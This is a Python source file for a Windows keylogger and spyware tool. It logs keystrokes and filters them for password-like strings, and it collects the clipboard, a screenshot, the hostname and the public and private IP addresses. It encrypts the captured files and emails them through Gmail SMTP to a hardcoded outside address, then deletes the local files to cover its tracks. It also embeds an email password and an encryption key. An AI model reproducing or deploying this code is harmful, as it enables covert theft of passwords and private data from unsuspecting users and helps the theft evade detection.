# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import re
from pynput import keyboard 
import socket
import platform
import threading
import time
import win32clipboard
from pynput.keyboard import Key, Listener
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from PIL import ImageGrab

# Variables
keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
microphone_time = 20
time_iteration = 15
number_of_iterations_end = 1
email_address = "mr.invalid008@gmail.com"
password = "uhzl hdwi qpyq jutz"
toaddr = "2020uec1773@mnit.ac.in"
key = "qnRM8NN5RGdnR7EiRCIJWIysscy_5iQ3UBfcYE9C4uo="
file_path = "C:\\Users\\mrinv\\Desktop\\CodePython\\FirstPython"
extend = "\\"
file_merge = file_path + extend

# Clear the contents of key_log.txt at the start of each execution
with open(file_path + extend + keys_information, "w") as f:
    pass

# Email controls
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body,'plain'))
    filename = filename
    attachment = open(attachment,'rb')
    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

# Keylogging and pattern matching
def find_words_with_pattern(text):
    word_pattern = re.compile(r'\b(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=])[\w@#$%^&+=]+\b')
    found_words = set(re.findall(word_pattern, text))
    return found_words

def process_key_log_file():
    with open(file_path + extend + keys_information, "r") as key_log_file:
        key_log_text = key_log_file.read()
    found_words = find_words_with_pattern(key_log_text)
    if found_words:
        with open(file_path + extend + "found_words.txt", "w") as found_words_file:
            found_words_file.write("\n".join(found_words))
    send_email("found_words.txt", os.path.join(file_path, "found_words.txt"), toaddr)

# Get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')
computer_information()

# Get the clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied\n")
copy_clipboard()

# Get the screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
screenshot()

# Keylogger functionality
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
count = 0
keys = []

def on_press(key):
    global keys, count, currentTime
    print(key)
    keys.append(key)
    count += 1
    currentTime = time.time()
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        send_email(keys_information, file_path + extend + keys_information, toaddr)
        return False
    if currentTime > stoppingTime:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
count = 0
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)
    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

# Clean up tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)